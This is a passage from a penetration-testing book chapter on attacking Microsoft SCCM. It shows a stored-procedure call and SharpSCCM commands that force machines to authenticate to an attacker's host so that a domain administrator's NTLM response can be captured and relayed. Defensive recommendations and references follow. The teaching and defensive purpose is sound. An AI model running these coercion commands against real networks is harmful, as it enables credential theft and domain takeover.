<p>Another information-gathering activity is to dump tables related to task sequences and look for credentials. The output will be obfuscated, but the <strong class="source-inline">DeObfuscateSecretString</strong> tool in the <strong class="source-inline">SharpSCCM</strong> repository by <em class="italic">Mayyhem</em> will be able <span class="No-Break">to help.</span></p>
<p>Lastly, there <a id="_idIndexMarker1038"/>is a stored procedure called <strong class="source-inline">sp_CP_GenerateCCRByName</strong> that can be used to force client push installation and the MP machine account to authenticate to the <strong class="source-inline">ADMIN$</strong> share on the machine of our choice. The code is <span class="No-Break">as follows:</span></p>
<pre class="console">
USE CM_WIN
GO
DECLARE @return_value int
EXEC    @return_value = [dbo].[sp_CP_GenerateCCRByName]
        @MachineNameList = N'192.168.56.106',
        @SiteCode = N'WIN',
        @bForced = false,
        @bForceReinstall = false
SELECT 'Return Value' = @return_value
GO</pre> <p>The result is a forced authentication attempt, as you can <span class="No-Break">see here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer293">
<img alt="Figure 10.13 – Forced authentication as a result of stored procedure execution" height="418" src="image/B18964_10_13.jpg" width="1587"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.13 – Forced authentication as a result of stored procedure execution</p>
<p>Realistically, these <a id="_idIndexMarker1039"/>post-exploitation actions are not required, as all of these actions were shown in earlier stages. The idea was to emphasize the fact that the primary site SQL Server also needs to be well hardened <span class="No-Break">and maintained.</span></p>
<h2 id="_idParaDest-219"><a id="_idTextAnchor239"/>Deploying an application</h2>
<p>This is the last<a id="_idIndexMarker1040"/> scenario for lateral movement. It can also be treated as a persistence technique. A common scenario is to deploy malicious applications throughout the environment or on specific targets. However, we will try another scenario. The application installation from the controlled UNC path is triggered, so we can capture the domain administrator <span class="No-Break">NTLM response.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">The original research by <em class="italic">Mayyhem</em> can be found <span class="No-Break">here: </span><a href="https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867"><span class="No-Break">https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867</span></a><span class="No-Break">.</span></p>
<p>I will grant the <strong class="source-inline">vinegrep</strong> user <strong class="source-inline">Full Administrator</strong> rights; however, just <strong class="source-inline">Application Administrator</strong> should be enough. New permissions can be verified by running the <span class="No-Break">following command:</span></p>
<pre class="console">
SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames</pre> <p>The result of the command execution <span class="No-Break">is next:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer294">
<img alt="Figure 10.14 – New permissions were applied" height="634" src="image/B18964_10_14.jpg" width="1343"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.14 – New permissions were applied</p>
<p>Our plan is to find an<a id="_idIndexMarker1041"/> active device with a client installed where the primary user is <strong class="source-inline">Administrator</strong>. We will extract the resource ID for the next step. The following commands will provide the <span class="No-Break">required information:</span></p>
<pre class="console">
SharpSCCM.exe get primary-users -u Administrator
SharpSCCM.exe get devices -w "Active=1 and Client=1"</pre> <p>The result of the commands’ execution is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer295">
<img alt="Figure 10.15 – The WIN10 machine is our target device" height="1887" src="image/B18964_10_15.jpg" width="1252"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.15 – The WIN10 machine is our target device</p>
<p>The attack <a id="_idIndexMarker1042"/>consists of the <span class="No-Break">following steps:</span></p>
<ol>
<li>Create a new <span class="No-Break">device collection.</span></li>
<li>Add a target machine to <span class="No-Break">this collection.</span></li>
<li>Create an application with a UNC path to the <span class="No-Break">attacker’s machine.</span></li>
<li>Task the target device from the collection to install the <span class="No-Break">new application.</span></li>
</ol>
<p>The following command will automate the <span class="No-Break">preceding steps:</span></p>
<pre class="console">
SharpSCCM.exe exec -rid 16777219 -r 192.168.56.100</pre> <p>The attack execution is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer296">
<img alt="Figure 10.16 – Successful attack execution" height="1083" src="image/B18964_10_16.jpg" width="1650"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.16 – Successful attack execution</p>
<p>After some time, we<a id="_idIndexMarker1043"/> captured the NTLM response, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer297">
<img alt="Figure 10.17 – Successful relay to Exchange server" height="289" src="image/B18964_10_17.jpg" width="1038"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.17 – Successful relay to Exchange server</p>
<p>This attack may also be used against a lot of users. If required, the computer account can also be forced to authenticate with the <strong class="source-inline">--run-as-system</strong> flag. The last section will explain <span class="No-Break">defensive recommendations.</span></p>
<h1 id="_idParaDest-220"><a id="_idTextAnchor240"/>Defensive recommendations</h1>
<p>Defensive recommendations <a id="_idIndexMarker1044"/>are a part of the great <strong class="source-inline">SharpSCCM</strong> wiki. Here, we will cover the ones that are most effective but also easy to implement. I will not repeat things such as install updates, ensure that privileged accounts use strong passwords, audit activities, enforce signing if possible, and so on. Let’s look at some <span class="No-Break">defensive recommendations:</span></p>
<ul>
<li>To prevent coercion, NTLM fallback should <span class="No-Break">be disabled</span></li>
<li>Disable NAAs in the domain and use enhanced <span class="No-Break">HTTP instead</span></li>
<li>Use the <strong class="bold">Software Update</strong> functionality to install clients instead of Automatic site-wide client <span class="No-Break">push installation</span></li>
<li>Clean task sequences and device collection variables from <span class="No-Break">sensitive data</span></li>
<li>For PXE, set a strong password for media and disable <span class="No-Break"><strong class="bold">F8 Debugging</strong></span></li>
<li>Check service accounts to ensure the least privileges principle <span class="No-Break">is applied</span></li>
<li>Do not run the web client service to avoid <span class="No-Break">HTTP coercion</span></li>
<li>Enable multi-factor authentication for SMS <span class="No-Break">provider calls[17]</span></li>
<li>Require <strong class="bold">Extended Protection for Authentication</strong> (<strong class="bold">EPA</strong>) on <a id="_idIndexMarker1045"/>the site database to <a id="_idIndexMarker1046"/>avoid relays to MS <span class="No-Break">SQL Server</span></li>
</ul>
<p>The first three recommendations will significantly decrease your risk of being compromised. There is also a guide on how to use SCCM as a hunting tool for <span class="No-Break">malicious activity[18].</span></p>
<h1 id="_idParaDest-221"><a id="_idTextAnchor241"/>Summary</h1>
<p>This chapter covered techniques and attacks on IT administration software. We have briefly discussed ways to compromise WSUS and the available tooling for such adversary activity. Furthermore, we had a deep dive into the SCCM ecosystem and saw in practice how misconfiguration can lead to the complete overtake of the environment. Later, in the <em class="italic">Defensive recommendations</em> section, I stressed the three most important recommendations to improve the SCCM <span class="No-Break">security posture.</span></p>
<p>Overall, this entire book should demonstrate how complex Windows-based infrastructure is, and how many hidden parts it has. Clearly, new vulnerabilities and attack vectors will appear regularly, but there are enough security mechanisms to make the life of an adversary <span class="No-Break">much harder.</span></p>
<h1 id="_idParaDest-222"><a id="_idTextAnchor242"/>References</h1>
<ol>
<li><span class="No-Break"><strong class="bold">PyWSUS</strong></span><span class="No-Break">: </span><a href="https://github.com/GoSecure/pywsus"><span class="No-Break">https://github.com/GoSecure/pywsus</span></a></li>
<li><span class="No-Break"><strong class="bold">bettercap</strong></span><span class="No-Break">: </span><a href="https://github.com/bettercap/bettercap"><span class="No-Break">https://github.com/bettercap/bettercap</span></a></li>
<li>WSUS <span class="No-Break">Attacks: </span><a href="https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/"><span class="No-Break">https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/</span></a></li>
<li><span class="No-Break"><strong class="bold">WSuspicious</strong></span><span class="No-Break">: </span><a href="https://github.com/GoSecure/WSuspicious"><span class="No-Break">https://github.com/GoSecure/WSuspicious</span></a></li>
<li>Deploy <span class="No-Break">WSUS: </span><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/deploy-windows-server-update-services"><span class="No-Break">https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/deploy-windows-server-update-services</span></a></li>
<li>WSUS Group Policy Settings to Deploy <span class="No-Break">Updates: </span><a href="https://woshub.com/group-policy-settings-to-deploy-updates-using-wsus/"><span class="No-Break">https://woshub.com/group-policy-settings-to-deploy-updates-using-wsus/</span></a></li>
<li><span class="No-Break"><strong class="bold">SharpWSUS</strong></span><span class="No-Break">: </span><a href="https://github.com/nettitude/SharpWSUS"><span class="No-Break">https://github.com/nettitude/SharpWSUS</span></a></li>
<li><span class="No-Break"><strong class="bold">WSUSpendu</strong></span><span class="No-Break">: </span><a href="https://github.com/alex-dengx/WSUSpendu"><span class="No-Break">https://github.com/alex-dengx/WSUSpendu</span></a></li>
<li><span class="No-Break"><strong class="bold">PSExec</strong></span><span class="No-Break">: </span><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec"><span class="No-Break">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</span></a></li>
<li><em class="italic">The Hacker Recipes</em> <span class="No-Break">website: </span><a href="https://www.thehacker.recipes/ad/movement/sccm-mecm"><span class="No-Break">https://www.thehacker.recipes/ad/movement/sccm-mecm</span></a></li>
<li><span class="No-Break"><strong class="bold">PXEThief</strong></span><span class="No-Break">: </span><a href="https://github.com/MWR-CyberSec/PXEThief"><span class="No-Break">https://github.com/MWR-CyberSec/PXEThief</span></a></li>
<li>Christopher Panayi, <em class="italic">Pulling Passwords out of Configuration </em><span class="No-Break"><em class="italic">Manager</em></span><span class="No-Break">: </span><a href="https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Christopher%20Panayi%20-%20Pulling%20Passwords%20out%20of%20Configuration%20Manager%20Practical%20Attacks%20against%20Microsofts%20Endpoint%20Management%20Software.pdf"><span class="No-Break">https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Christopher%20Panayi%20-%20Pulling%20Passwords%20out%20of%20Configuration%20Manager%20Practical%20Attacks%20against%20Microsofts%20Endpoint%20Management%20Software.pdf</span></a></li>
<li><span class="No-Break"><strong class="bold">SharpSCCM</strong></span><span class="No-Break">: </span><a href="https://github.com/Mayyhem/SharpSCCM/"><span class="No-Break">https://github.com/Mayyhem/SharpSCCM/</span></a></li>
<li><span class="No-Break"><strong class="bold">CMLoot</strong></span><span class="No-Break">: </span><a href="https://github.com/1njected/CMLoot"><span class="No-Break">https://github.com/1njected/CMLoot</span></a></li>
<li>The <strong class="bold">sccmhunter</strong> <span class="No-Break">tool: </span><a href="https://github.com/garrettfoster13/sccmhunter#mssql"><span class="No-Break">https://github.com/garrettfoster13/sccmhunter#mssql</span></a></li>
<li>The <strong class="bold">sccmdecryptpoc</strong> <span class="No-Break">tool: </span><a href="https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1"><span class="No-Break">https://gist.github.com/xpn/5f497d2725a041922</span> <span class="No-Break">c427c3aaa3b37d1</span></a></li>
<li>Enable MFA for SMS Provider <span class="No-Break">calls: </span><a href="https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/setup-migrate-backup-recovery/enable-mfa-for-sms-provider-calls"><span class="No-Break">https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/setup-migrate-backup-recovery/enable-mfa-for-sms-provider-calls</span></a></li>
<li>SCCM for <span class="No-Break">DFIR: </span><a href="https://informationonsecurity.blogspot.com/2015/11/microsofts-accidental-enterprise-dfir.xhtml"><span class="No-Break">https://informationonsecurity.blogspot.com/2015/11/microsofts-accidental-enterprise-dfir.xhtml</span></a></li>
</ol>
<h1 id="_idParaDest-223"><a id="_idTextAnchor243"/>Further reading</h1>
<p>These aids for further study will let you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ul>
<li>Gabriel Prud’homme, <em class="italic">SCCM Exploitation: The First Cred Is the Deepest </em><span class="No-Break"><em class="italic">II</em></span><span class="No-Break">: </span><a href="https://www.youtube.com/watch?v=W9PC9erm_pI"><span class="No-Break">https://www.youtube.com/watch?v=W9PC9erm_pI</span></a></li>
<li>Chris Thompson, <em class="italic">SharpSCCM Demos at 2023 Black Hat USA </em><span class="No-Break"><em class="italic">Arsenal</em></span><span class="No-Break">: </span><a href="https://www.youtube.com/watch?v=uyI5rgR0D-s"><span class="No-Break">https://www.youtube.com/watch?v=uyI5rgR0D-s</span></a></li>
<li>Christopher Panayi, <em class="italic">Identifying and retrieving credentials from SCCM/MECM Task </em><span class="No-Break"><em class="italic">Sequences</em></span><span class="No-Break">: </span><a href="https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences"><span class="No-Break">https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences</span></a></li>
<li>HTTP418InfoSec, <em class="italic">Offensive SCCM </em><span class="No-Break"><em class="italic">Summary</em></span><span class="No-Break">: </span><a href="https://http418infosec.com/offensive-sccm-summary"><span class="No-Break">https://http418infosec.com/offensive-sccm-summary</span></a></li>
</ul>
</div>
</div></body></html>